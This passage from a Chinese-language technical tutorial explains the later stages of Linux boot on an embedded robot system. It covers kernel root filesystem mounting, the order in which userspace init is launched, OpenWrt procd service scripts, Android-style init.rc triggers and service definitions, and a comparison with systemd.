<pre><code class="hljs language-c" lang="c">do_basic_setup();
</code></pre>
<p>执行基本系统设置。</p>
</li>
<li>
<p><strong>等待initramfs</strong></p>
<pre><code class="hljs language-c" lang="c">wait_for_initramfs();
</code></pre>
<p>等待initramfs就绪（如果使用）。</p>
</li>
<li>
<p><strong>控制台就绪</strong></p>
<pre><code class="hljs language-c" lang="c">console_on_rootfs();
</code></pre>
<p>在根文件系统上打开控制台。</p>
</li>
<li>
<p><strong>准备命名空间</strong></p>
<pre><code class="hljs language-c" lang="c">prepare_namespace();
</code></pre>
<p>准备命名空间（挂载根文件系统等）。</p>
</li>
</ol>
<h3 data-id="heading-128">7.4 根文件系统挂载</h3>
<h4 data-id="heading-129">7.4.1 prepare_namespace</h4>
<pre><code class="hljs language-c" lang="c">prepare_namespace();
</code></pre>
<p><strong>作用</strong>: 准备命名空间，主要是挂载根文件系统。</p>
<h4 data-id="heading-130">7.4.2 根文件系统挂载流程</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">prepare_namespace</span>()
    ↓
挂载initramfs (如果使用)
    ↓
执行initramfs中的init (如果存在)
    ↓
挂载真正的根文件系统
    ↓
切换到根文件系统
    ↓
卸载initramfs (如果使用)
</code></pre>
<h4 data-id="heading-131">7.4.3 根文件系统类型</h4>
<p>内核支持多种根文件系统：</p>
<ul>
<li><strong>ext2/ext3/ext4</strong>: 传统的Linux文件系统</li>
<li><strong>squashfs</strong>: 压缩的只读文件系统</li>
<li><strong>initramfs</strong>: 初始RAM文件系统</li>
<li><strong>NFS</strong>: 网络文件系统</li>
<li><strong>其他</strong>: 根据内核配置支持的文件系统</li>
</ul>
<h4 data-id="heading-132">7.4.4 根设备指定</h4>
<p>根设备可以通过以下方式指定：</p>
<ol>
<li><strong>内核参数</strong>: <code>root=/dev/sda1</code></li>
<li><strong>UUID</strong>: <code>root=UUID=xxx</code></li>
<li><strong>PARTUUID</strong>: <code>root=PARTUUID=xxx</code></li>
<li><strong>设备树</strong>: 设备树中指定</li>
</ol>
<h3 data-id="heading-133">7.5 释放初始化内存</h3>
<h4 data-id="heading-134">7.5.1 释放目的</h4>
<p>初始化完成后，可以释放：</p>
<ul>
<li>初始化代码段</li>
<li>初始化数据段</li>
<li>不再需要的初始化数据结构</li>
</ul>
<h4 data-id="heading-135">7.5.2 释放过程</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 等待所有异步初始化完成</span>
async_synchronize_full();

<span class="hljs-comment">// 释放各种初始化内存</span>
kprobe_free_init_mem();
ftrace_free_init_mem();
kgdb_free_init_mem();
exit_boot_config();
free_initmem();
</code></pre>
<h4 data-id="heading-136">7.5.3 标记只读</h4>
<pre><code class="hljs language-c" lang="c">mark_readonly();
</code></pre>
<p><strong>作用</strong>: 将内核代码段标记为只读。</p>
<p><strong>目的</strong>: 防止内核代码被修改，提高安全性。</p>
<h3 data-id="heading-137">7.6 启动用户空间init</h3>
<h4 data-id="heading-138">7.6.1 启动顺序</h4>
<p>init进程按以下顺序尝试启动用户空间init：</p>
<ol>
<li><strong>ramdisk_execute_command</strong>: 通常是<code>/init</code>（initramfs中的init）</li>
<li><strong>execute_command</strong>: 内核参数<code>init=</code>指定的程序</li>
<li><strong>CONFIG_DEFAULT_INIT</strong>: 编译时指定的默认init</li>
<li><strong>标准路径</strong>:
<ul>
<li><code>/sbin/init</code></li>
<li><code>/etc/init</code></li>
<li><code>/bin/init</code></li>
<li><code>/bin/sh</code></li>
</ul>
</li>
</ol>
<h4 data-id="heading-139">7.6.2 启动代码</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 1. 尝试ramdisk_execute_command</span>
<span class="hljs-keyword">if</span> (ramdisk_execute_command) {
    ret = run_init_process(ramdisk_execute_command);
    <span class="hljs-keyword">if</span> (!ret)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// 2. 尝试execute_command</span>
<span class="hljs-keyword">if</span> (execute_command) {
    ret = run_init_process(execute_command);
    <span class="hljs-keyword">if</span> (!ret)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    panic(<span class="hljs-string">"Requested init %s failed"</span>, execute_command);
}

<span class="hljs-comment">// 3. 尝试默认init</span>
<span class="hljs-keyword">if</span> (CONFIG_DEFAULT_INIT[<span class="hljs-number">0</span>] != <span class="hljs-string">'\0'</span>) {
    ret = run_init_process(CONFIG_DEFAULT_INIT);
    <span class="hljs-keyword">if</span> (!ret)
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// 4. 尝试标准路径</span>
<span class="hljs-keyword">if</span> (!try_to_run_init_process(<span class="hljs-string">"/sbin/init"</span>) ||
    !try_to_run_init_process(<span class="hljs-string">"/etc/init"</span>) ||
    !try_to_run_init_process(<span class="hljs-string">"/bin/init"</span>) ||
    !try_to_run_init_process(<span class="hljs-string">"/bin/sh"</span>))
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;

<span class="hljs-comment">// 5. 如果都失败，panic</span>
panic(<span class="hljs-string">"No working init found"</span>);
</code></pre>
<h4 data-id="heading-140">7.6.3 run_init_process</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_init_process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *init_filename)</span>
{
    argv_init[<span class="hljs-number">0</span>] = init_filename;
    <span class="hljs-keyword">return</span> kernel_execve(init_filename, argv_init, envp_init);
}
</code></pre>
<p><strong>作用</strong>: 执行用户空间的init程序。</p>
<p><strong>关键</strong>: 这是内核执行的最后一个函数，之后控制权交给用户空间。</p>
<hr/>
<h2 data-id="heading-141">8. 用户空间应用启动</h2>
<h3 data-id="heading-142">8.1 Init程序概述</h3>
<h4 data-id="heading-143">8.1.1 Init程序的作用</h4>
<p>Init程序是用户空间的第一个进程（PID 1），负责：</p>
<ul>
<li>启动系统服务</li>
<li>管理进程</li>
<li>处理孤儿进程</li>
<li>系统关闭</li>
</ul>
<h4 data-id="heading-144">8.1.2 常见的Init程序</h4>
<ul>
<li><strong>SysV init</strong>: 传统的init系统</li>
<li><strong>systemd</strong>: 现代的init系统（大多数Linux发行版使用）</li>
<li><strong>Upstart</strong>: Ubuntu曾经使用的init系统</li>
<li><strong>BusyBox init</strong>: 嵌入式系统常用（本系统使用）</li>
<li><strong>OpenRC</strong>: Gentoo等发行版使用</li>
<li><strong>init.rc</strong>: Android风格的启动脚本（本系统使用）</li>
</ul>
<h3 data-id="heading-145">8.2 Init.rc启动机制（本系统使用）</h3>
<h4 data-id="heading-146">8.2.1 Init.rc概述</h4>
<p>本系统使用<strong>init.rc</strong>作为主要的启动脚本机制，这是一种类似Android的启动脚本系统，结合了OpenWrt的procd进程管理。</p>
<h4 data-id="heading-147">8.2.2 Init.rc的特点</h4>
<ol>
<li><strong>Android风格语法</strong>: 使用类似Android的init.rc语法</li>
<li><strong>服务定义</strong>: 可以定义系统服务</li>
<li><strong>触发器</strong>: 支持on init、on boot、on startup等触发器</li>
<li><strong>进程管理</strong>: 使用procd进行进程管理和监控</li>
<li><strong>依赖管理</strong>: 支持服务依赖关系</li>
</ol>
<h4 data-id="heading-148">8.2.3 Init.rc文件位置</h4>
<p>系统中存在多个init.rc相关文件：</p>
<ul>
<li><strong><code>/etc/init.rc</code></strong>: 主要的init.rc配置文件</li>
<li><strong><code>/etc/init.d/init.rc</code></strong>: init.rc服务的启动脚本</li>
<li><strong><code>/etc/rc.d/S15init.rc</code></strong>: 启动时的符号链接</li>
<li><strong><code>/etc/rc.d/K15init.rc</code></strong>: 关闭时的符号链接</li>
</ul>
<h4 data-id="heading-149">8.2.4 Init.rc语法</h4>
<h5 data-id="heading-150">触发器（Trigger）</h5>
<p>触发器定义了在特定时机执行的命令：</p>
<pre><code class="hljs language-rc" lang="rc">on init
    import /etc/cgroup.rc

on boot
    class_start default
    import /oem/node/nardds/conf/init/nardds.rc

on startup
    exec /usr/bin/startup_app.sh &amp;
</code></pre>
<p><strong>常见的触发器</strong>:</p>
<ul>
<li><strong>on init</strong>: 系统初始化时执行</li>
<li><strong>on boot</strong>: 系统启动时执行</li>
<li><strong>on startup</strong>: 系统就绪后执行</li>
<li><strong>on property</strong>: 属性变化时执行</li>
<li><strong>on fs</strong>: 文件系统挂载时执行</li>
</ul>
<h5 data-id="heading-151">服务定义（Service）</h5>
<p>服务定义了系统服务的启动方式：</p>
<pre><code class="hljs language-rc" lang="rc">service toplog /oem/script/utils/dump_top_log.sh
    oneshot
    disabled

service audio_server /oem/script/utils/audio_server
    retry 10
    disabled

service dhcpcd /sbin/dhcpcd -f /etc/dhcpcd.conf
    suc_oneshot
    retry 10
    disabled
</code></pre>
<p><strong>服务属性</strong>:</p>
<ul>
<li><strong>oneshot</strong>: 服务只执行一次，不持续运行</li>
<li><strong>suc_oneshot</strong>: 成功执行一次后退出</li>
<li><strong>retry</strong>: 失败后重试次数</li>
<li><strong>disabled</strong>: 默认不启动，需要手动启动</li>
<li><strong>class</strong>: 服务所属的类</li>
<li><strong>user</strong>: 运行服务的用户</li>
</ul>
<h4 data-id="heading-152">8.2.5 Init.rc启动流程</h4>
<h5 data-id="heading-153">完整的启动流程</h5>
<pre><code class="hljs language-csharp" lang="csharp">内核启动<span class="hljs-keyword">init</span>进程
    ↓
读取/etc/inittab
    ↓
执行/etc/<span class="hljs-keyword">init</span>.d/rcS S boot
    ↓
执行/etc/rc.d/下的启动脚本（按START顺序）
    ├─ S10boot (START=<span class="hljs-number">10</span>)
    │   └─ 挂载文件系统、初始化硬件
    ├─ S12syslogd (START=<span class="hljs-number">12</span>)
    │   └─ 启动系统日志服务
    ├─ S15init.rc (START=<span class="hljs-number">15</span>)
    │   └─ 启动<span class="hljs-keyword">init</span>.rc服务
    │       └─ 执行/usr/bin/<span class="hljs-keyword">init</span>.rc
    │           └─ 解析/etc/<span class="hljs-keyword">init</span>.rc
    │               ├─ 执行<span class="hljs-keyword">on</span> <span class="hljs-keyword">init</span>触发器
    │               ├─ 执行<span class="hljs-keyword">on</span> boot触发器
    │               └─ 启动定义的服务
    └─ S80auto_startup (START=<span class="hljs-number">80</span>)
        └─ 启动自动启动的应用
</code></pre>
<h5 data-id="heading-154">Inittab配置</h5>
<p><code>/etc/inittab</code>文件定义了init进程的行为：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">:</span><span class="hljs-symbol">:sysinit</span><span class="hljs-symbol">:/etc/init</span>.d/rcS S boot
<span class="hljs-symbol">:</span><span class="hljs-symbol">:shutdown</span><span class="hljs-symbol">:/etc/init</span>.d/rcS K shutdown
<span class="hljs-symbol">:</span><span class="hljs-symbol">:askconsole</span><span class="hljs-symbol">:/bin/ash</span> --login
</code></pre>
<p><strong>说明</strong>:</p>
<ul>
<li><strong>sysinit</strong>: 系统初始化时执行<code>/etc/init.d/rcS S boot</code></li>
<li><strong>shutdown</strong>: 系统关闭时执行<code>/etc/init.d/rcS K shutdown</code></li>
<li><strong>askconsole</strong>: 请求控制台时执行<code>/bin/ash --login</code></li>
</ul>
<h5 data-id="heading-155">RcS脚本</h5>
<p><code>/etc/init.d/rcS</code>脚本负责执行启动和关闭脚本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动时执行</span>
/etc/init.d/rcS S boot
    ↓
遍历/etc/rc.d/S*脚本
    ↓
按START值排序
    ↓
依次执行start函数
</code></pre>
<p><strong>启动脚本命名规则</strong>:</p>
<ul>
<li><strong>S##name</strong>: 启动脚本，##是START值（两位数字）</li>
<li><strong>K##name</strong>: 关闭脚本，##是STOP值（两位数字）</li>
</ul>
<h4 data-id="heading-156">8.2.6 Init.rc服务管理</h4>
<h5 data-id="heading-157">Procd进程管理</h5>
<p>Init.rc服务使用<strong>procd</strong>（Process Daemon）进行管理：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/init.d/init.rc</span>
<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    <span class="hljs-keyword">if</span> [ -x <span class="hljs-string">"/usr/bin/<span class="hljs-variable">$INITRC</span>"</span> ]; <span class="hljs-keyword">then</span>
        procd_open_instance
        procd_set_param oom_adj <span class="hljs-variable">$OOM_ADJ</span>
        procd_set_param <span class="hljs-built_in">command</span> /bin/sh -c <span class="hljs-string">"source /opt/ros/kinetic/setup.sh &amp;&amp; export PYTHONPATH=/oem/lib/python3.10/dist-packages/:\$PYTHONPATH &amp;&amp; exec /usr/bin/<span class="hljs-variable">$INITRC</span>"</span>
        procd_close_instance
    <span class="hljs-keyword">fi</span>
}
</code></pre>
<p><strong>Procd的作用</strong>:</p>
<ul>
<li><strong>进程监控</strong>: 监控服务进程，崩溃时自动重启</li>
<li><strong>资源限制</strong>: 设置OOM调整值，防止服务被OOM killer杀死</li>
<li><strong>环境设置</strong>: 设置服务运行环境</li>
<li><strong>日志管理</strong>: 管理服务的标准输出和错误输出</li>
</ul>
<h5 data-id="heading-158">服务启动顺序</h5>
<p>服务通过<code>START</code>和<code>DEPEND</code>参数控制启动顺序：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/init.d/init.rc</span>
START=15      <span class="hljs-comment"># 启动顺序（数字越小越早启动）</span>
STOP=15       <span class="hljs-comment"># 停止顺序</span>
DEPEND=boot   <span class="hljs-comment"># 依赖boot服务</span>
USE_PROCD=1   <span class="hljs-comment"># 使用procd管理</span>
</code></pre>
<p><strong>依赖关系</strong>:</p>
<ul>
<li><strong>DEPEND=boot</strong>: 必须在boot服务启动后才能启动</li>
<li><strong>DEPEND=init.rc</strong>: 必须在init.rc服务启动后才能启动</li>
</ul>
<h4 data-id="heading-159">8.2.7 Boot脚本详解</h4>
<p>Boot脚本（<code>/etc/init.d/boot</code>）是系统启动的基础脚本，负责：</p>
<h5 data-id="heading-160">1. 创建必要的目录</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p /var/run
<span class="hljs-built_in">mkdir</span> -p /var/log
<span class="hljs-built_in">mkdir</span> -p /var/lock
<span class="hljs-built_in">mkdir</span> -p /var/state
<span class="hljs-built_in">mkdir</span> -p /var/tmp
<span class="hljs-built_in">mkdir</span> -p /tmp/.uci
</code></pre>
<h5 data-id="heading-161">2. 挂载虚拟文件系统</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 挂载debugfs（调试文件系统）</span>
grep -q debugfs /proc/filesystems &amp;&amp; /bin/mount -o noatime -t debugfs debugfs /sys/kernel/debug

<span class="hljs-comment"># 挂载bpf文件系统</span>
grep -q bpf /proc/filesystems &amp;&amp; /bin/mount -o nosuid,nodev,noexec,noatime,mode=0700 -t bpf bpffs /sys/fs/bpf

<span class="hljs-comment"># 挂载pstore（持久化存储）</span>
grep -q pstore /proc/filesystems &amp;&amp; /bin/mount -o noatime -t pstore pstore /sys/fs/pstore
</code></pre>
<h5 data-id="heading-162">3. 创建设备链接</h5>
<pre><code class="hljs language-bash" lang="bash">link_by_name
</code></pre>
<p><strong>作用</strong>: 根据内核命令行参数创建<code>/dev/by-name/</code>下的设备链接，方便通过名称访问分区。</p>
<h5 data-id="heading-163">4. 加载内核模块</h5>
<pre><code class="hljs language-bash" lang="bash">/sbin/kmodloader
</code></pre>
<p><strong>作用</strong>: 加载需要的内核模块。</p>
<h5 data-id="heading-164">5. 初始化设备管理</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug
/sbin/mdev -s
</code></pre>
<p><strong>作用</strong>: 使用mdev进行设备管理，创建设备节点。</p>
<h5 data-id="heading-165">6. 挂载文件系统</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 挂载robotdata分区</span>
mount_robotdata

<span class="hljs-comment"># 根据是否加密选择挂载方式</span>
<span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"crypt"</span> /proc/cmdline; <span class="hljs-keyword">then</span>
    mount_data_enc      <span class="hljs-comment"># 加密方式挂载data</span>
    mount_oem_enc       <span class="hljs-comment"># 加密方式挂载oem</span>
    mapper_oem_update   <span class="hljs-comment"># 准备oem更新分区</span>
<span class="hljs-keyword">else</span>
    mount_data_normal   <span class="hljs-comment"># 普通方式挂载data</span>
    mount_oem_normal    <span class="hljs-comment"># 普通方式挂载oem</span>
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 挂载userdata分区</span>
mount_userdata
</code></pre>
<h5 data-id="heading-166">7. 文件系统挂载详解</h5>
<p><strong>Robotdata分区</strong>:</p>
<ul>
<li><strong>用途</strong>: 存储机器人数据</li>
<li><strong>挂载点</strong>: <code>/robotdata</code></li>
<li><strong>挂载选项</strong>: <code>ro,discard,sync,data=journal</code>（只读，除非工厂模式）</li>
</ul>
<p><strong>Data分区</strong>:</p>
<ul>
<li><strong>用途</strong>: 存储应用数据</li>
<li><strong>挂载点</strong>: <code>/data</code></li>
<li><strong>支持加密</strong>: 可以通过dm-crypt加密</li>
</ul>
<p><strong>OEM分区</strong>:</p>
<ul>
<li><strong>用途</strong>: 存储OEM相关文件</li>
<li><strong>挂载点</strong>: <code>/oem</code></li>
<li><strong>支持A/B分区</strong>: 支持oemA和oemB两个分区，用于OTA更新</li>
</ul>
<p><strong>Userdata分区</strong>:</p>
<ul>
<li><strong>用途</strong>: 存储用户数据</li>
<li><strong>挂载点</strong>: <code>/userdata</code></li>
<li><strong>自动清理</strong>: 当使用率超过90%时自动清理</li>
</ul>
<h4 data-id="heading-167">8.2.8 Init.rc服务启动</h4>
<h5 data-id="heading-168">Init.rc服务的启动脚本</h5>
<p><code>/etc/init.d/init.rc</code>脚本负责启动init.rc服务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh /etc/rc.common</span>
START=15
STOP=15
DEPEND=boot
USE_PROCD=1

INITRC=<span class="hljs-string">"init.rc"</span>
OOM_ADJ=-17

<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    <span class="hljs-keyword">if</span> [ -x <span class="hljs-string">"/usr/bin/<span class="hljs-variable">$INITRC</span>"</span> ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"Starting : <span class="hljs-variable">$INITRC</span>"</span> &gt; /dev/kmsg
        procd_open_instance
        procd_set_param oom_adj <span class="hljs-variable">$OOM_ADJ</span>
        procd_set_param <span class="hljs-built_in">command</span> /bin/sh -c <span class="hljs-string">"source /opt/ros/kinetic/setup.sh &amp;&amp; export PYTHONPATH=/oem/lib/python3.10/dist-packages/:\$PYTHONPATH &amp;&amp; exec /usr/bin/<span class="hljs-variable">$INITRC</span>"</span>
        procd_close_instance
    <span class="hljs-keyword">fi</span>
}
</code></pre>
<p><strong>关键点</strong>:</p>
<ol>
<li><strong>OOM_ADJ=-17</strong>: 设置OOM调整值为-17，防止被OOM killer杀死</li>
<li><strong>ROS环境</strong>: 加载ROS（Robot Operating System）环境</li>
<li><strong>Python路径</strong>: 设置Python模块搜索路径</li>
<li><strong>执行init.rc</strong>: 执行<code>/usr/bin/init.rc</code>程序</li>
</ol>
<h5 data-id="heading-169">Init.rc程序的工作</h5>
<p><code>/usr/bin/init.rc</code>程序（通常是Android的init程序或兼容实现）会：</p>
<ol>
<li><strong>解析init.rc文件</strong>: 读取<code>/etc/init.rc</code>并解析</li>
<li><strong>执行触发器</strong>: 按顺序执行on init、on boot等触发器</li>
<li><strong>启动服务</strong>: 启动定义的服务</li>
<li><strong>监控服务</strong>: 监控服务状态，崩溃时重启</li>
<li><strong>处理属性</strong>: 处理系统属性的变化</li>
</ol>
<h4 data-id="heading-170">8.2.9 自动启动应用</h4>
<h5 data-id="heading-171">Auto_startup服务</h5>
<p><code>/etc/init.d/auto_startup</code>服务负责启动自动启动的应用：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh /etc/rc.common</span>
START=80
STOP=99
DEPEND=init.rc
USE_PROCD=1
PROG=/etc/init.d/app_start

<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    procd_open_instance
    procd_set_param <span class="hljs-built_in">command</span> <span class="hljs-variable">$PROG</span> start
    procd_close_instance
}
</code></pre>
<p><strong>启动顺序</strong>:</p>
<ul>
<li><strong>START=80</strong>: 在init.rc之后启动</li>
<li><strong>DEPEND=init.rc</strong>: 依赖init.rc服务</li>
<li><strong>执行</strong>: <code>/etc/init.d/app_start start</code></li>
</ul>
<h5 data-id="heading-172">App_start脚本</h5>
<p><code>/etc/init.d/app_start</code>脚本负责启动具体的应用：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 通常包含：</span>
<span class="hljs-comment"># 1. 检查应用是否存在</span>
<span class="hljs-comment"># 2. 设置应用环境</span>
<span class="hljs-comment"># 3. 启动应用进程</span>
<span class="hljs-comment"># 4. 监控应用状态</span>
</code></pre>
<h4 data-id="heading-173">8.2.10 Init.rc的优势</h4>
<ol>
<li><strong>灵活性</strong>: 可以定义复杂的启动逻辑</li>
<li><strong>服务管理</strong>: 自动监控和重启服务</li>
<li><strong>依赖管理</strong>: 支持服务依赖关系</li>
<li><strong>触发器</strong>: 支持多种启动时机</li>
<li><strong>资源控制</strong>: 可以设置资源限制</li>
</ol>
<h4 data-id="heading-174">8.2.11 Init.rc调试</h4>
<h5 data-id="heading-175">查看服务状态</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有服务状态</span>
/etc/init.d/&lt;service&gt; status

<span class="hljs-comment"># 查看init.rc服务状态</span>
/etc/init.d/init.rc status
</code></pre>
<h5 data-id="heading-176">手动控制服务</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动服务</span>
/etc/init.d/&lt;service&gt; start

<span class="hljs-comment"># 停止服务</span>
/etc/init.d/&lt;service&gt; stop

<span class="hljs-comment"># 重启服务</span>
/etc/init.d/&lt;service&gt; restart

<span class="hljs-comment"># 重新加载配置</span>
/etc/init.d/&lt;service&gt; reload
</code></pre>
<h5 data-id="heading-177">查看日志</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看内核日志</span>
dmesg

<span class="hljs-comment"># 查看系统日志</span>
logread

<span class="hljs-comment"># 查看特定服务的日志</span>
/etc/init.d/&lt;service&gt; <span class="hljs-built_in">log</span>
</code></pre>
<h4 data-id="heading-178">8.2.12 Init.rc与Systemd的对比</h4>













































<table><thead><tr><th>特性</th><th>Init.rc</th><th>Systemd</th></tr></thead><tbody><tr><td>语法</td><td>Android风格</td><td>INI风格</td></tr><tr><td>进程管理</td><td>procd</td><td>systemd</td></tr><tr><td>服务定义</td><td>service关键字</td><td>[Service]段</td></tr><tr><td>触发器</td><td>on init/boot等</td><td>target和依赖</td></tr><tr><td>适用场景</td><td>嵌入式、OpenWrt</td><td>桌面、服务器</td></tr><tr><td>资源占用</td><td>较小</td><td>较大</td></tr><tr><td>功能丰富度</td><td>中等</td><td>非常丰富</td></tr></tbody></table>
<h4 data-id="heading-179">8.2.13 Init.rc配置示例</h4>
<h5 data-id="heading-180">完整的Init.rc配置示例</h5>
<pre><code class="hljs language-rc" lang="rc"># /etc/init.rc

# 初始化阶段
on init
    # 导入cgroup配置
    import /etc/cgroup.rc
    
    # 设置环境变量
    export PATH /usr/bin:/usr/sbin:/bin:/sbin

# 启动阶段
on boot
    # 启动默认类
    class_start default
    
    # 导入其他配置
    import /oem/node/nardds/conf/init/nardds.rc

# 启动后阶段
on startup
    # 后台启动启动脚本
    exec /usr/bin/startup_app.sh &amp;

# 定义服务
service toplog /oem/script/utils/dump_top_log.sh
    oneshot
    disabled

service audio_server /oem/script/utils/audio_server
    retry 10
    disabled

service dhcpcd /sbin/dhcpcd -f /etc/dhcpcd.conf
    suc_oneshot
    retry 10
    disabled
</code></pre>
<h5 data-id="heading-181">服务定义详解</h5>
<pre><code class="hljs language-rc" lang="rc">service &lt;name&gt; &lt;path&gt; [&lt;argument&gt;]*
    &lt;option&gt;
    &lt;option&gt;
    ...
</code></pre>
<p><strong>选项说明</strong>:</p>
<ul>
<li><strong>oneshot</strong>: 服务只执行一次</li>
<li><strong>suc_oneshot</strong>: 成功执行一次后退出</li>
<li><strong>retry </strong>: 失败后重试N次</li>
<li><strong>disabled</strong>: 默认不启动</li>
<li><strong>class </strong>: 指定服务类</li>
<li><strong>user </strong>: 指定运行用户</li>
<li><strong>group </strong>: 指定运行组</li>
<li><strong>seclabel </strong>: 指定SELinux标签</li>
</ul>
<h3 data-id="heading-182">8.3 Systemd启动流程（参考）</h3>
<h4 data-id="heading-183">8.3.1 Systemd概述</h4>
<p>Systemd是现代Linux系统最常用的init系统，但本系统使用的是init.rc机制。</p>
<h4 data-id="heading-184">8.3.2 Systemd启动阶段</h4>
<p>Systemd定义了多个启动目标（target）：</p>
<ol>
<li><strong>emergency.target</strong>: 紧急模式</li>
<li><strong>rescue.target</strong>: 救援模式</li>
<li><strong>multi-user.target</strong>: 多用户模式（无图形界面）</li>
<li><strong>graphical.target</strong>: 图形界面模式</li>
</ol>
<h4 data-id="heading-185">8.3.3 Systemd单元类型</h4>
<ul>
<li><strong>service</strong>: 系统服务</li>
<li><strong>target</strong>: 启动目标（类似运行级别）</li>
<li><strong>mount</strong>: 挂载点</li>
<li><strong>socket</strong>: 套接字</li>
<li><strong>timer</strong>: 定时器</li>
</ul>
<h4 data-id="heading-186">8.3.4 Systemd启动顺序</h4>
<pre><code class="hljs language-markdown" lang="markdown">systemd启动
<span class="hljs-code">    ↓
加载单元文件
    ↓
解析依赖关系
    ↓
按依赖顺序启动服务
    ↓
达到默认target
    ↓
系统就绪
</span></code></pre>
<h3 data-id="heading-187">8.4 系统服务启动</h3>
<h4 data-id="heading-188">8.4.1 服务启动顺序</h4>
<p>在本系统中，服务按以下顺序启动：</p>
<ol>
<li><strong>Boot服务</strong> (START=10): 挂载文件系统、初始化硬件</li>
<li><strong>系统服务</strong> (START=12-13): syslogd、klogd等日志服务</li>
<li><strong>Init.rc服务</strong> (START=15): 启动init.rc，执行init.rc脚本</li>
<li><strong>应用服务</strong> (START=80): 自动启动的应用</li>
</ol>
<h4 data-id="heading-189">8.4.2 服务依赖</h4>
<p>服务通过<code>DEPEND</code>参数定义依赖关系：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># /etc/init.d/init.rc</span>
DEPEND=boot  <span class="hljs-comment"># 依赖boot服务</span>

<span class="hljs-comment"># /etc/init.d/auto_startup</span>
DEPEND=init.rc  <span class="hljs-comment"># 依赖init.rc服务</span>
</code></pre>
<p><strong>依赖机制</strong>:</p>
<ul>
<li>被依赖的服务必须先启动</li>
<li>如果依赖的服务启动失败，当前服务不会启动</li>
<li>依赖关系通过procd管理</li>
</ul>
<h4 data-id="heading-190">8.4.3 服务启动控制</h4>
<p>服务通过<code>START</code>值控制启动顺序：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># START值越小，启动越早</span>
S10boot      <span class="hljs-comment"># START=10，最早启动</span>
S12syslogd   <span class="hljs-comment"># START=12</span>
S15init.rc   <span class="hljs-comment"># START=15</span>
S80auto_startup  <span class="hljs-comment"># START=80，较晚启动</span>
</code></pre>
<h3 data-id="heading-191">8.5 登录和用户会话</h3>
<h4 data-id="heading-192">8.5.1 登录管理器</h4>
<p>在本系统中，通常使用：</p>
<ul>
<li><strong>getty</strong>: 文本终端登录（嵌入式系统常用）</li>
<li><strong>串口登录</strong>: 通过串口进行登录</li>
<li><strong>SSH登录</strong>: 通过网络SSH登录</li>
</ul>
<h4 data-id="heading-193">8.5.2 用户会话启动</h4>
<p>用户登录后，启动用户会话：</p>
<ol>
<li><strong>加载用户配置</strong>: 加载<code>.bashrc</code>、<code>.profile</code>等</li>
<li><strong>设置环境变量</strong>: 设置PATH、ROS环境等</li>
<li><strong>启动应用</strong>: 根据配置启动应用</li>
</ol>
<h3 data-id="heading-194">8.6 启动脚本</h3>
<h4 data-id="heading-195">8.6.1 启动脚本位置</h4>
<p>在本系统中，启动脚本位于：</p>
<ul>
<li><strong><code>/etc/init.d/</code></strong>: 实际的启动脚本</li>
<li><strong><code>/etc/rc.d/</code></strong>: 启动时的符号链接（S开头）和关闭时的符号链接（K开头）</li>
<li><strong><code>/etc/init.rc</code></strong>: init.rc主配置文件</li>
<li><strong><code>/oem/</code></strong>: OEM特定的启动脚本</li>
</ul>
<h4 data-id="heading-196">8.6.2 启动脚本执行流程</h4>
<pre><code class="hljs language-bash" lang="bash">系统启动
    ↓
读取/etc/inittab
    ↓
执行/etc/init.d/rcS S boot
    ↓
遍历/etc/rc.d/S*脚本
    ↓
按START值排序
    ↓
依次执行start函数
    ↓
所有服务启动完成
</code></pre>
<h4 data-id="heading-197">8.6.3 启动脚本结构</h4>
<p>每个启动脚本都遵循相同的结构：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh /etc/rc.common</span>

START=10      <span class="hljs-comment"># 启动顺序</span>
STOP=98       <span class="hljs-comment"># 停止顺序</span>
DEPEND=boot   <span class="hljs-comment"># 依赖关系</span>
USE_PROCD=1   <span class="hljs-comment"># 使用procd管理</span>

<span class="hljs-function"><span class="hljs-title">start_service</span></span>() {
    <span class="hljs-comment"># 启动服务的代码</span>
}

<span class="hljs-function"><span class="hljs-title">stop_service</span></span>() {
    <span class="hljs-comment"># 停止服务的代码</span>
}

<span class="hljs-function"><span class="hljs-title">reload_service</span></span>() {
    <span class="hljs-comment"># 重新加载配置的代码</span>
}
</code></pre>
<h4 data-id="heading-198">8.6.4 脚本执行顺序示例</h4>
<p>以本系统为例：</p>
